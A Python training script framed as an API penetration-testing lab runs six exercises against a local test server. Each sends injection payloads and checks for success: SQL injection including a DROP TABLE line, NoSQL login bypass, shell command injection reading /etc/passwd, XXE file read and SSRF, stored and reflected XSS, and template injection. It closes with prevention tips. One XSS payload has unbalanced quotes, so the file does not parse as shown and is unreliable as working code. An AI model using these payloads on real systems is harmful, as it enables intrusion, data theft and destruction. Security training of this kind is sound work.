#!/usr/bin/env python3
"""
API Penetration Testing Lab - Intermediate Lab 2: Injection Attacks

Topics: SQL injection, NoSQL injection, Command injection, XXE, XSS in API responses
Difficulty: Intermediate
"""

import requests
import json
from urllib.parse import urljoin, quote
from typing import Dict, List, Any

BASE_URL = "http://localhost:5000/api"

class InjectionAttacksLab:
    """Lab for testing injection vulnerabilities in APIs"""
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = BASE_URL
        self.vulnerabilities = []
    
    # EXERCISE 1: SQL Injection in API Parameters
    def exercise_1_sql_injection(self):
        """
        Exercise 1: Test SQL injection in API parameters
        
        Learning Goals:
        - SQL injection fundamentals
        - Error-based SQL injection
        - Union-based SQL injection
        - Boolean-based blind SQL injection
        
        Tasks:
        1. Test basic SQL injection
        2. Analyze error responses
        3. Extract data
        """
        print("\n=== Exercise 1: SQL Injection ===")
        
        print("\n[Task 1] Testing for SQL injection in query parameters...")
        
        # SQL injection payloads
        sql_payloads = [
            "'",  # Basic quote
            "' OR '1'='1",  # Classic SQLi
            "' OR 1=1--",  # Comment-based
            "1' UNION SELECT NULL--",  # Union-based
            "1'; DROP TABLE users--",  # Destructive (don't execute)
            "1' AND SLEEP(5)--",  # Time-based blind
        ]
        
        for payload in sql_payloads:
            try:
                response = self.session.get(
                    urljoin(self.base_url, "/users"),
                    params={"id": payload}
                )
                
                # Look for SQL error messages
                error_indicators = [
                    "SQL", "sql", "syntax", "database", "mysql", "postgres",
                    "error", "Error", "Exception", "ORA-", "PL/SQL"
                ]
                
                for indicator in error_indicators:
                    if indicator in response.text:
                        print(f"[!] Potential SQL injection:")
                        print(f"    Payload: {payload}")
                        print(f"    Error indicator: {indicator}")
                        self.vulnerabilities.append("SQL Injection")
                        break
            except Exception:
                pass
    
    # EXERCISE 2: NoSQL Injection
    def exercise_2_nosql_injection(self):
        """
        Exercise 2: Test NoSQL injection
        
        Learning Goals:
        - MongoDB injection operators
        - Query object manipulation
        - NoSQL bypass techniques
        
        Tasks:
        1. Test operator injection
        2. Bypass authentication
        """
        print("\n=== Exercise 2: NoSQL Injection ===")
        
        print("\n[Task 1] Testing NoSQL injection in JSON body...")
        
        # NoSQL injection payloads
        nosql_payloads = [
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"$where": "return true"},
        ]
        
        for payload in nosql_payloads:
            try:
                response = self.session.post(
                    urljoin(self.base_url, "/auth/login"),
                    json=payload
                )
                
                if response.status_code == 200 or "token" in response.text.lower():
                    print(f"[!] Potential NoSQL injection:")
                    print(f"    Payload: {payload}")
                    print(f"    Status: {response.status_code}")
                    self.vulnerabilities.append("NoSQL Injection")
            except Exception:
                pass
    
    # EXERCISE 3: Command Injection
    def exercise_3_command_injection(self):
        """
        Exercise 3: Test command injection
        
        Learning Goals:
        - Shell command injection
        - Command separator exploitation
        - Data exfiltration through commands
        
        Tasks:
        1. Test basic command injection
        2. Attempt command execution
        """
        print("\n=== Exercise 3: Command Injection ===")
        
        print("\n[Task 1] Testing command injection...")
        
        # Command injection payloads
        cmd_payloads = [
            "; ls",
            "| ls",
            "`whoami`",
            "$(whoami)",
            "; id",
            "| id",
            "; cat /etc/passwd",
        ]
        
        for payload in cmd_payloads:
            try:
                response = self.session.get(
                    urljoin(self.base_url, "/api/execute"),
                    params={"command": payload}
                )
                
                # Look for command execution indicators
                if "root:" in response.text or "uid=" in response.text:
                    print(f"[!] Command injection detected:")
                    print(f"    Payload: {payload}")
                    print(f"    Response: {response.text[:100]}")
                    self.vulnerabilities.append("Command Injection")
            except Exception:
                pass
    
    # EXERCISE 4: XML External Entity (XXE) Injection
    def exercise_4_xxe_injection(self):
        """
        Exercise 4: Test XXE vulnerabilities
        
        Learning Goals:
        - XXE attack principles
        - File read attacks
        - SSRF via XXE
        
        Tasks:
        1. Test XXE file read
        2. Test XXE SSRF
        """
        print("\n=== Exercise 4: XXE Injection ===")
        
        print("\n[Task 1] Testing XXE vulnerabilities...")
        
        # XXE payload - file read
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''
        
        try:
            response = self.session.post(
                urljoin(self.base_url, "/api/process-xml"),
                data=xxe_payload,
                headers={"Content-Type": "application/xml"}
            )
            
            if "root:" in response.text or "/bin/" in response.text:
                print(f"[!] XXE file read vulnerability:")
                print(f"    Response: {response.text[:200]}")
                self.vulnerabilities.append("XXE Injection")
        except Exception:
            pass
        
        # XXE payload - SSRF
        print("\n[Task 2] Testing XXE for SSRF...")
        
        xxe_ssrf = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:5000/admin">
]>
<root>&xxe;</root>'''
        
        try:
            response = self.session.post(
                urljoin(self.base_url, "/api/process-xml"),
                data=xxe_ssrf,
                headers={"Content-Type": "application/xml"}
            )
            
            if response.status_code == 200:
                print(f"[!] XXE SSRF potential:")
                print(f"    Status: {response.status_code}")
                self.vulnerabilities.append("XXE SSRF")
        except Exception:
            pass
    
    # EXERCISE 5: Cross-Site Scripting (XSS) in API Responses
    def exercise_5_xss_in_api(self):
        """
        Exercise 5: Test XSS in API responses
        
        Learning Goals:
        - Stored XSS in API data
        - Reflected XSS through API
        - DOM XSS in API consumers
        
        Tasks:
        1. Test stored XSS
        2. Test reflected XSS
        """
        print("\n=== Exercise 5: Cross-Site Scripting (XSS) in APIs ===")
        
        print("\n[Task 1] Testing stored XSS...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror='alert(1)'>",
            "<svg onload=alert('XSS')>",
            "'"><script>alert(1)</script>",
        ]
        
        for payload in xss_payloads:
            try:
                # Try to store XSS payload
                response = self.session.post(
                    urljoin(self.base_url, "/users"),
                    json={
                        "username": "testuser",
                        "bio": payload,
                        "email": "test@example.com"
                    }
                )
                
                if response.status_code == 201 or response.status_code == 200:
                    # Try to retrieve it
                    get_response = self.session.get(urljoin(self.base_url, "/users"))
                    if payload in get_response.text:
                        print(f"[!] Stored XSS vulnerability:")
                        print(f"    Payload: {payload}")
                        self.vulnerabilities.append("Stored XSS")
            except Exception:
                pass
        
        print("\n[Task 2] Testing reflected XSS...")
        
        for payload in xss_payloads:
            try:
                response = self.session.get(
                    urljoin(self.base_url, "/search"),
                    params={"q": payload}
                )
                
                if payload in response.text:
                    print(f"[!] Reflected XSS vulnerability:")
                    print(f"    Payload: {payload}")
                    self.vulnerabilities.append("Reflected XSS")
            except Exception:
                pass
    
    # EXERCISE 6: Template Injection
    def exercise_6_template_injection(self):
        """
        Exercise 6: Test template injection
        
        Learning Goals:
        - Server-side template injection
        - Template syntax exploitation
        - Code execution via templates
        
        Tasks:
        1. Test common template syntaxes
        """
        print("\n=== Exercise 6: Template Injection ===")
        
        print("\n[Task 1] Testing template injection...")
        
        template_payloads = [
            "${7*7}",  # Expression Language
            "{{7*7}}",  # Jinja2
            "<%= 7*7 %>",  # ERB
            "#{7*7}",  # Thymeleaf
        ]
        
        for payload in template_payloads:
            try:
                response = self.session.get(
                    urljoin(self.base_url, "/template"),
                    params={"name": payload}
                )
                
                # Check if math was evaluated
                if "49" in response.text:
                    print(f"[!] Template injection detected:")
                    print(f"    Payload: {payload}")
                    print(f"    Result: Math executed (7*7=49)")
                    self.vulnerabilities.append("Template Injection")
            except Exception:
                pass
    
    def print_summary(self):
        """Print vulnerability summary"""
        print("\n" + "="*60)
        print("Injection Vulnerabilities Found")
        print("="*60)
        
        if self.vulnerabilities:
            unique_vulns = list(set(self.vulnerabilities))
            print(f"\nTotal vulnerabilities: {len(unique_vulns)}")
            for vuln in unique_vulns:
                print(f"  - {vuln}")
        else:
            print("\nNo injection vulnerabilities detected")
    
    def run_all_exercises(self):
        """Run all exercises"""
        print("\n" + "="*60)
        print("API Penetration Testing Lab - Intermediate Lab 2")
        print("Injection Attacks")
        print("="*60)
        
        self.exercise_1_sql_injection()
        self.exercise_2_nosql_injection()
        self.exercise_3_command_injection()
        self.exercise_4_xxe_injection()
        self.exercise_5_xss_in_api()
        self.exercise_6_template_injection()
        
        self.print_summary()
        
        print("\nKey Prevention Measures:")
        print("1. Use parameterized queries")
        print("2. Input validation and sanitization")
        print("3. Disable dangerous XML features")
        print("4. Output encoding")
        print("5. Use ORM frameworks")
        print("\nNext: Lab 3 - Business Logic and Rate Limiting")

if __name__ == "__main__":
    try:
        lab = InjectionAttacksLab()
        lab.run_all_exercises()
    except KeyboardInterrupt:
        print("\n\nLab interrupted by user.")
    except Exception as e:
        print(f"\nLab error: {e}")
